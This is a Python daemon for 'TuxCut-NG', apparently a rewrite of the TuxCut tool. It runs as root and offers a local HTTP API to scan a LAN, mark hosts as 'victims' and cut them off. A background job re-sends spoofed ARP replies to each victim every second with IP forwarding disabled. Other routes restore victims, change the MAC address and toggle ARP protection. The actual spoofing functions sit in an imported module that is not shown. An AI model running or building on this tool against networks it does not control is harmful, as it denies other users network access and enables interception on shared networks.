#!/usr/bin/env python3
"""TuxCut-NG daemon — run as root."""

import sys, os, json, atexit
sys.path.insert(0, os.path.dirname(__file__))

from setproctitle import setproctitle
from bottle import route, run, request, response, hook
from apscheduler.schedulers.background import BackgroundScheduler

from utils import (get_default_gw, get_my_info, scan_network,
                   arp_spoof, arp_restore, change_mac,
                   enable_protection, disable_protection)

setproctitle('tuxcutd')

victims = []
_gw = {}

# ── Scheduler: re-send spoofed ARP every second ──────────────────────
def _attack():
    if not victims or not _gw:
        return
    os.system('sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1')
    my_mac = get_my_info(_gw.get('iface', '')).get('mac', '')
    for v in list(victims):
        try:
            arp_spoof(v, _gw, my_mac)
        except Exception:
            pass

sched = BackgroundScheduler(daemon=True)
sched.add_job(_attack, 'interval', seconds=1, id='spoof')
sched.start()

# ── Cleanup ───────────────────────────────────────────────────────────
@atexit.register
def _cleanup():
    for v in list(victims):
        try: arp_restore(v, _gw)
        except Exception: pass
    disable_protection()
    sched.shutdown(wait=False)

# ── CORS ──────────────────────────────────────────────────────────────
@hook('after_request')
def _cors():
    response.content_type = 'application/json'

# ── Routes (same API as original TuxCut) ─────────────────────────────
@route('/status')
def status():
    return json.dumps({'status': 'success'})

@route('/gw')
def gw():
    global _gw
    _gw = get_default_gw()
    if _gw:
        return json.dumps({'status': 'success', 'gw': _gw})
    return json.dumps({'status': 'error', 'msg': 'No gateway'})

@route('/my/<iface>')
def my(iface):
    info = get_my_info(iface)
    return json.dumps({'status': 'success', 'my': info})

@route('/scan/<gw_ip>')
def scan(gw_ip):
    hosts = scan_network(gw_ip)
    return json.dumps({'result': {'status': 'success', 'hosts': hosts}})

@route('/cut', method='POST')
def cut():
    v = request.json
    if v and v not in victims:
        victims.append(v)
    return json.dumps({'status': 'success'})

@route('/resume', method='POST')
def resume():
    v = request.json
    if v in victims:
        victims.remove(v)
    arp_restore(v, _gw)
    return json.dumps({'status': 'success'})

@route('/protect', method='POST')
def protect():
    enable_protection(request.forms.get('ip'), request.forms.get('mac'),
                      request.forms.get('iface', _gw.get('iface', '')))
    return json.dumps({'status': 'success'})

@route('/unprotect')
def unprotect():
    disable_protection(_gw.get('iface', ''), _gw.get('ip', ''))
    return json.dumps({'status': 'success'})

@route('/change-mac/<iface>')
def do_change_mac(iface):
    mac = change_mac(iface)
    s = 'success' if mac else 'error'
    return json.dumps({'result': {'status': s, 'new_mac': mac or ''}})

# ── Start ─────────────────────────────────────────────────────────────
if __name__ == '__main__':
    if os.geteuid() != 0:
        sys.exit('ERROR: must run as root')

    # Fix Errno 98: free the port if a previous instance crashed
    os.system('fuser -k 8013/tcp >/dev/null 2>&1')

    print('TuxCut-NG daemon starting on 127.0.0.1:8013 …')
    run(host='127.0.0.1', port=8013, quiet=True, server='wsgiref')
